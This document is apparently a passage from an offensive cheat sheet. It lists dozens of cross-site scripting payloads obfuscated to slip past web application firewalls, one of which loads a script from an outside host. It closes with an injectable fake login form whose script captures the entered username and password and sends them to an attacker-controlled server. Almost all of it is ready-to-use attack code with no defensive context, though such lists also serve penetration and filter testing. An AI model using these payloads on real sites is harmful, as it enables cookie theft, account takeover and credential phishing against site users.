### WAF bypass
```
<a href="javascript&colon;alert&lpar;document&period;cookie&rpar;">REDIRECT TO LOGIN</a>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<iMG onerror="top['loc\u{61}tion'] = 'javascript:alert\u{28})'" src />
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<img src='1' onerror='alert(0)' <
<img src=1 onerror="s=document.createElement('sCriPt');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
<iMG src &gt; onerror="alert&#x000000028;&#x29;" />
<iMG src onload=%ff%00%ffAAA onerror=alert() />
<img src="/" =_=" title="onerror='prompt(1)'">
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
<iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
<iNpUt type=image src onerror="prompt(1)">
<iNpUt type=im&#x000000000000000000000000000000061;ge &gt; id="x"oNerRor="window['\a\l\ert']()" src />
<iNpUt x='&#39; /> ' id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt x="&quot; /> " id=""onfocus="window['\a\l\ert']()" autofocus/>
<iNpUt x="&#x22; /> " id=""onfocus="window['\a\l\ert']()" autofocus/> 
<oBjECt data="javascript:window['\a\l\ert']()" />
<sCriPt>$=1,alert($)</sCriPt>
<sCriPt>$=1,\u0061lert($)</sCriPt>
<sCriPt>alert``</sCriPt>
<sCriPt ~~~>confirm(1)</sCriPt ~~~>
<sCriPt>eval('alert\x280\x29');</sCriPt>
<sCriPt>Function('alert\x280\x29')();</sCriPt>
<</sCriPt/sCriPt><sCriPt>eval('\\u'+'0061'+'lert(1)')//</sCriPt>
<</sCriPt/sCriPt><sCriPt ~~~>\u0061lert(1)</sCriPt ~~~>
<sCriPt>setTimeout('alert\x280\x29',0);</sCriPt>
<sCriPt>window.location='javascript:alert(0)';</sCriPt>
<sCriPt x> alert(1) </sCriPt 1=2
<sCriPt x>alert('XSS')<sCriPt y>
</style></sCriPt><sCriPt>alert(1)</sCriPt>
<svg><animate onbegin=alert() attributeName=x></svg>
<svg id=`x`onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg onload=alert(1)//
<svg////////onload=alert(1)>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg><x><sCriPt>alert('1'&#41</x>
```

### Fake authentication form sending credentials to remote server

    <input type="text" name="username" id="username" /><input type="password" name="password" id="password" /><script>function sleep(ms){return new Promise(r => setTimeout(r,ms));}sleep(3000).then(()=> {var user =document.getElementById('username').value;var pass = document.getElementById('password').value;var user_pass = user+"_"+pass;fetch("https://[YOUR_SERVER]?u="+user_pass);});</script>
